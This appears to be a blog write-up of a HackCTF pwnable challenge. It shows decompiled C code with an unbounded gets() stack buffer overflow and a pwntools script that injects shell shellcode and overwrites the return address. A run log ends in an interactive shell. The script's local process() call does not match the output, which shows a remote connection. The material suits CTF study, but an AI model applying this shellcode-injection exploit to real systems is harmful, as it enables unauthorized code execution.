---
layout: post
title: "HackCTF x64 Simple_size_BOF"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# x64 Simple_size_BOF

## Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[27952]; // [rsp+0h] [rbp-6D30h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts(s);
  printf("buf: %p\n", v4);
  gets(v4);
  return 0;
}
```

## Solve

```python
from pwn import *

#context.log_level = 'DEBUG'
context.arch = 'amd64'
e = ELF("./Simple_size_bof")
p = process("./Simple_size_bof")
#r = remote("ctf.j0n9hyun.xyz", 3005)

shell = shellcraft.amd64.linux.sh()
print p.recvuntil("buf: 0x"),
buffer = p.recv(12)
print buffer
offset = 0x6d30 + 8
print "shellcode size : ",len(asm(shell))

payload = ''
payload += asm(shell)
payload += "A"*(offset-len(asm(shell)))
payload += p64(int(buffer, 16))

p.sendline(payload)
p.interactive()
```

```bash
➜  hackctf python Simple_size_bof.py
[*] '/home/ubuntu/ctf/hackctf/Simple_size_bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to ctf.j0n9hyun.xyz on port 3005: Done
삐빅- 자살방지 문제입니다.
buf: 0x 7ffc56838230
shellcode size :  48
[*] Switching to interactive mode

$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)x64 Simple_size_BOF
```